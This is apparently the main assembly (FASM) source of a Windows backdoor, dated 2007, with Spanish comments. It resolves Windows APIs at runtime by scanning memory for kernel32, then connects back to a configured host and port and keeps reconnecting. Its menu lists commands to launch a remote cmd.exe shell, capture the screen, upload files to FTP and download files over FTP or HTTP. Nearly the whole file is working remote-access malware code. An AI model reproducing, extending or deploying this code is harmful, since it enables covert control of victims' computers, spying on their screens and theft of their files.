;
; Author: Chema Garcia (aka sch3m4)
; Date: 2007
; Contact:
;    http://safetybits.net
;    sch3m4@safetybits.net
;    http://twitter.com/sch3m4
;

format PE GUI 4.0
entry INIT
;cabeceras
include 'c:\fasm\include\win32a.inc'

struct SECURITY_ATTRIBUTES
       nLength			dd	0
       lpSecurityDescriptor	dd	0
       bInheritHandle		dd	0
ends

struct RGBQUAD
       rgbBlue		db	0
       rgbGreen 	db	0
       rgbRed		db	0
       rgbReserved	db	0
ends

struct BITMAPINFO
       bmiHeader	BITMAPINFOHEADER	0
       bmiColors	RGBQUAD 		1 dup(0)

ends


;[+--------------------------------------------------------------+]
;[+-- DIRECCIONES DE LAS APIS OBTENIDAS EN TIEMPO DE EJECUCION --+]
;[+--------------------------------------------------------------+]
ExitProcess		   equ dword [Offsets]
CreateProcess		   equ dword [Offsets+4]
WaitForSingleObject	   equ dword [Offsets+8]
TerminateProcess	   equ dword [Offsets+0Ch]
LoadLibrary		   equ dword [Offsets+10h]
CreatePipe		   equ dword [Offsets+14h]
PeekNamedPipe		   equ dword [Offsets+18h]
ReadFile		   equ dword [Offsets+1Ch]
WriteFile		   equ dword [Offsets+20h]
Sleep			   equ dword [Offsets+24h]
CloseHandle		   equ dword [Offsets+28h]
CreateThread		   equ dword [Offsets+2Ch]
ResumeThread		   equ dword [Offsets+30h]
ExitThread		   equ dword [Offsets+34h]
TerminateThread 	   equ dword [Offsets+38h]
CreateFile		   equ dword [Offsets+3Ch]
LocalAlloc		   equ dword [Offsets+40h]
LocalFree		   equ dword [Offsets+44h]


atoi			   equ dword [Offsets+48h]
WSAStartup		   equ dword [Offsets+4Ch]
WSACleanup		   equ dword [Offsets+50h]
htons			   equ dword [Offsets+54h]
inet_addr		   equ dword [Offsets+58h]
inet_ntoa		   equ dword [Offsets+5Ch]
WSASocket		   equ dword [Offsets+60h]
connect 		   equ dword [Offsets+64h]
closesocket		   equ dword [Offsets+68h]
send			   equ dword [Offsets+6Ch]
recv			   equ dword [Offsets+70h]
gethostbyname		   equ dword [Offsets+74h]
GetSystemMetrics	   equ dword [Offsets+78h]
GetDesktopWindow	   equ dword [Offsets+7Ch]
GetDC			   equ dword [Offsets+80h]
CreateCompatibleDC	   equ dword [Offsets+84h]
CreateCompatibleBitmap	   equ dword [Offsets+88h]
SelectObject		   equ dword [Offsets+8Ch]
BitBlt			   equ dword [Offsets+90h]
GetDIBits		   equ dword [Offsets+94h]
DeleteDC		   equ dword [Offsets+98h]
ReleaseDC		   equ dword [Offsets+9Ch]
DeleteObject		   equ dword [Offsets+0A0h]

include 'inc\socket.inc'
include 'inc\funciones.inc'
include 'inc\shell.inc'
include 'inc\captura.inc'
include 'inc\RC4.inc'

;################################################################
;################################################################
section '.data' data readable writeable executable
;[+-----------------------------------------------------------------------------+]
;[+-- DATOS DE FUNCIONES, APIs Y LIBRERIAS PARA CARGAR EN TIEMPO DE EJECUCION --+]
;[+-----------------------------------------------------------------------------+]

kBase		   dd			0;base del kernel
vBase		   dd			0;base de msvcrt.dll
wBase		   dd			0;base de ws2_32.dll
uBase		   dd			0;base de user32.dll
gBase		   dd			0;base de gdi32.dll
GPA		   db			'GetProcAddress',0
oGPA		   dd			0;offset de la API GetProcAddress
APIs:
		   db			'ExitProcess',0
		   db			'CreateProcessA',0
		   db			'WaitForSingleObject',0
		   db			'TerminateProcess',0
		   db			'LoadLibraryA',0
		   db			'CreatePipe',0
		   db			'PeekNamedPipe',0
		   db			'ReadFile',0
		   db			'WriteFile',0
		   db			'Sleep',0
		   db			'CloseHandle',0
		   db			'CreateThread',0
		   db			'ResumeThread',0
		   db			'ExitThread',0
		   db			'TerminateThread',0
		   db			'CreateFile',0
		   db			'LocalAlloc',0
		   db			'LocalFree',0
		   db			'-',0
MSVCRT:
		   db			'atoi',0
		   db			'-',0
WS2_32:
		   db			'WSAStartup',0
		   db			'WSACleanup',0
		   db			'htons',0
		   db			'inet_addr',0
		   db			'inet_ntoa',0
		   db			'WSASocketA',0
		   db			'connect',0
		   db			'closesocket',0
		   db			'send',0
		   db			'recv',0
		   db			'gethostbyname',0
		   db			'-',0
USER32:
		   db			'GetSystemMetrics',0
		   db			'GetDesktopWindow',0
		   db			'GetDC',0
		   db			'-',0
GDI32:
		   db			'CreateCompatibleDC',0
		   db			'CreateCompatibleBitmap',0
		   db			'SelectObject',0
		   db			'BitBlt',0
		   db			'GetDIBits',0
		   db			'DeleteDC',0
		   db			'ReleaseDC',0
		   db			'DeleteObject',0
		   db			'-',0

LibWSock	   db			'ws2_32.dll',0
LibVcrt 	   db			'msvcrt.dll',0
LibUser 	   db			'user32.dll',0
LibGdi		   db			'gdi32.dll',0
Offsets:;DIRECCIONES DE LAS APIS OBTENIDAS EN TIEMPO DE EJECUCION
		   dd			0x28 dup(0)

;[+-----------------------------------------------------------------+]
;[+-- VARIABLES PARA EL SOCKET PRINCIPAL Y TRANSFERENCIA DE DATOS --+]
;[+-----------------------------------------------------------------+]
HOST		   db			'localhost',0 ;host remoto al que conectar
PUERTO		   dd			0x1238;puerto
sckConexion	   dd			0
wsaData 	   WSADATA		0
insockaddr	   sockaddr_in		0
Buffer		   db			0x400	 dup(0);1024 bytes

;[+--------------------------------------+]
;[+-- VARIABLES PARA LANZAR LA CONSOLA --+]
;[+--------------------------------------+]
stdinRd 	   dd			0
stdinWr 	   dd			0
stdoutRd	   dd			0
stdoutWr	   dd			0
SecAt		   SECURITY_ATTRIBUTES	0
socketShell	   dd			0
wsaShell	   WSADATA		0
sckaddrinShell	   sockaddr_in		0
SInfo		   STARTUPINFO		0
PI		   PROCESS_INFORMATION	0
BufferShell	   db			0x64 dup(0)
BufferRecvShell    db			0x400 dup(0)
stuff		   dd			0
hHilo		   dd			0;handle del hilo que maneja la consola
idHilo		   dd			0;id del hilo
CMD		   db			'cmd.exe',0

;[+-----------------------------------------+]
;[+-- VARIABLES PARA CAPTURAR LA PANTALLA --+]
;[+-----------------------------------------+]
Alto		   dd			0
Ancho		   dd			0
Hwnd		   dd			0
hDC		   dd			0
memDC		   dd			0
hBM		   dd			0
hBMOld		   dd			0
bmi		   BITMAPINFO		0
pbBits		   dd			0
bfh		   BITMAPFILEHEADER	0

;[+------------+]
;[+-- BANNER --+]
;[+------------+]
Baner1		   db			0x0D,0x0A,'     ___         _      _  _          _        _   ___    ___',0x0D,0x0A,'    / _ \ __  __| |__  | || |    ___ | | __ __| | / _ \  / _ \  _ __',0x0D,0x0A,'   | | | |\ \/ /| ',0x27,'_ \ | || |_  / __|| |/ // _` || | | || | | || ',0x27,'__|',0
Baner2		   db			'   | |_| | >  < | |_) ||__   _|| (__ |   <| (_| || |_| || |_| || |',0x0D,0x0A,'    \___/ /_/\_\|_.__/    |_|   \___||_|\_\\__,_| \___/  \___/ |_|',0x0D,0x0A,0x0D,0x0A,0
Consola 	   db			0x0D,0x0A,'[CMD]# ',0

;[+--------------+]
;[+-- COMANDOS --+]
;[+--------------+]
Retorno 	   db			0x0D,0x0A,0
Cruz		   db			'[+] ',0
Error		   db			'[!] ',0
Salir		   db			'salir         - Cierra la puerta trasera',0
Comandos	   db			'comandos      - Muestra una lista con los comandos disponibles',0
Shell		   db			'shell         - Lanza una consola remota',0
FinShell	   db			'finshell      - Finaliza la shell',0
CapPant 	   db			'capant        - Capturar pantalla',0
SubirFtp	   db			'subirftp      - Sube un archivo a un ftp',0
DescargarFtp	   db			'descargarftp  - Descarga un archivo de un ftp',0
DescargarHttp	   db			'descargarhttp - Descarga un archivo de una web',0
Desconocido	   db			'Envia "comandos" para ver una lista de los comandos disponibles',0

;[+-----------------------+]
;[+-- MENSAJES DE ERROR --+]
;[+-----------------------+]
ErrorConexion	   db			'[+] Error de conexion!',0
ShellError	   db			'Error!',0
DatosErroneos	   db			'[!] Formato de datos incorrecto!',0
ErrorRecibir	   db			'[!] Error al recibir los datos',0

;[+-----------------------------+]
;[+-- MENSAJES DE INFORMACION --+]
;[+-----------------------------+]
PideHost	   db			'[+] Introduce los datos (Host:Puerto): ',0
PideArchivo	   db			'[+] Guardar captura en: ',0
Lanzando	   db			'[+] Lanzando consola remota...',0
ShellOk 	   db			'Lanzada!',0
;################################################################
;################################################################

;################################################################
;################################################################
section '.code' code readable writeable executable

INIT:
;[+-----------------------------------------------------------------+]
;[+-- CARGAMOS LAS LIBRERIAS Y EXTRAEMOS LAS FUNCIONES NECESARIAS --+]
;[+-----------------------------------------------------------------+]

;#####################################################################
call delta;buscamos el delta offset
delta:
pop ebp
sub ebp,[delta]
mov eax,[esp]
xor ax,ax
;hacemos este bloque por rapidez, la mayoría de las veces EAX va a apuntar a la base del kernel
sub eax,10000h
cmp word [eax],0x5A4D
je enco_mz
add eax,10000h

busca_mz:;buscamos la cabecera del kernel
cmp word [eax],0x5A4D;MZ
je enco_mz
sub eax,1000h
jmp busca_mz
enco_mz:
mov dword [esp-4],eax;base del kernel32.dll
mov ecx,dword [eax+03Ch]
add ecx,eax
mov dword [esp-8],ecx;comienzo de la cabecera PE
mov ecx,dword [ecx+78h]
add ecx,eax
mov dword [esp-0Ch],ecx;ecx = seccion de exportaciones
mov ecx,dword [ecx+20h];
add ecx,eax
;mov dword [esp-10h],ecx;tabla de nombres (de las exportaciones)
mov eax,ecx
xor edx,edx
;buscamos la api "GetProcAddress"
busca:
mov edi,[eax]
add edi,dword [esp-4]
lea esi,dword [GPA]
mov ecx,0Eh
rep cmpsb
je calcula_offset
add eax,4
inc edx
jmp busca

calcula_offset:
mov eax,dword [esp-0Ch]
mov eax,dword [eax+24h]
add eax, dword [esp-4]
rol edx,1
add eax,edx
mov cx,word [eax]
mov eax,dword [esp-0Ch]
mov eax,dword [eax+1Ch]
add eax,dword [esp-4]
rol ecx,2
xadd eax,ecx
mov eax,dword [eax]
add eax,dword [esp-4]
mov dword [oGPA],eax
mov ecx,[esp-4]
mov [kBase],ecx
;#####################################################################

;SACAMOS LAS APIS DEL KERNEL
lea edi,dword [APIs]
lea esi,dword [Offsets]
;#####################################################################
apis_kernel:
push edi
push dword [kBase]
call dword [oGPA]
mov [esi],eax
;nos vamos a la siguiente api
siguiente_akernel:
cmp byte [edi],0
je sigue_kernel
inc edi
jmp siguiente_akernel
sigue_kernel:
add esi,4
inc edi
cmp byte [edi],'-'
jne apis_kernel
;#####################################################################


;#####################################################################
;CARGAMOS MSVCRT.DLL Y CARGAMOS LAS FUNCIONES
push esi
push LibVcrt
call LoadLibrary
mov [vBase],eax
lea edi,dword [MSVCRT]
pop esi

apis_msvcrt:
push edi
push dword [vBase]
call dword [oGPA]
mov [esi],eax
;nos vamos a la siguiente api
siguiente_amsvcrt:
cmp byte [edi],0
je sigue_msvcrt
inc edi
jmp siguiente_amsvcrt
sigue_msvcrt:
add esi,4
inc edi
cmp byte [edi],'-'
jne apis_msvcrt
;#####################################################################

;#####################################################################
;CARGAMOS WS2_32.DLL Y CARGAMOS LAS FUNCIONES
push esi
push LibWSock
call LoadLibrary
mov [wBase],eax
lea edi,dword [WS2_32]
pop esi

apis_ws232:
push edi
push dword [wBase]
call dword [oGPA]
mov [esi],eax
;nos vamos a la siguiente api
siguiente_aws232:
cmp byte [edi],0
je sigue_ws232
inc edi
jmp siguiente_aws232
sigue_ws232:
add esi,4
inc edi
cmp byte [edi],'-'
jne apis_ws232
;#####################################################################

;#####################################################################
;CARGAMOS USER32.DLL Y CARGAMOS LAS FUNCIONES
push esi
push LibUser
call LoadLibrary
mov [uBase],eax
lea edi,dword [USER32]
pop esi

apis_user32:
push edi
push dword [uBase]
call dword [oGPA]
mov [esi],eax
siguiente_auser32:
cmp byte [edi],0
je sigue_user32
inc edi
jmp siguiente_auser32
sigue_user32:
add esi,4
inc edi
cmp byte [edi],'-'
jne apis_user32
;#####################################################################

;#####################################################################
;CARGAMOS GDI32.DLL Y CARGAMOS LAS FUNCIONES
push esi
push LibGdi
call LoadLibrary
mov [gBase],eax
lea edi,dword [GDI32]
pop esi

apis_gdi32:
push edi
push dword [gBase]
call dword [oGPA]
mov [esi],eax
siguiente_agdi32:
cmp byte [edi],0
je sigue_gdi32
inc edi
jmp siguiente_agdi32
sigue_gdi32:
add esi,4
inc edi
cmp byte [edi],'-'
jne apis_gdi32
;#####################################################################

;#####################################################################
;[+------------------------------+]
;[+-- EL CÓDIGO DE LA BACKDOOR --+]
;[+------------------------------+]
INICIO:
push 0x10
call Sleep

call WSACleanup
push insockaddr
push wsaData
push sckConexion
push [PUERTO]
push HOST
call CrearConexion
or eax,0
jne INICIO
push sckConexion
call EnviaBanner

;#################################################################
bucle_backdoor:;BUCLE DE CONEXION
	push Consola
	push sckConexion
	call EnviarDatos

	push 0x400
	push Buffer
	push sckConexion
	call RecibirDatos
	cmp eax,-1
	je INICIO;si se ha desconectado reconectamos

	push Buffer
	call CerrarBackdoor
	je salida_backdoor;si quiere salir, salimos

	push Buffer
	push sckConexion
	call Analiza;analizamos el comando
	push 0x10
	call Sleep
	jmp bucle_backdoor
;#################################################################

salida_backdoor:
push 0
push [PI.hProcess]
call TerminateProcess
push [socketShell]
call closesocket
push 0
push [hHilo]
call TerminateThread
push [sckConexion]
call closesocket;cerramos la conexio principal
call WSACleanup;limpiamos
push 0
call ExitProcess;salimos
;################################################################
;################################################################
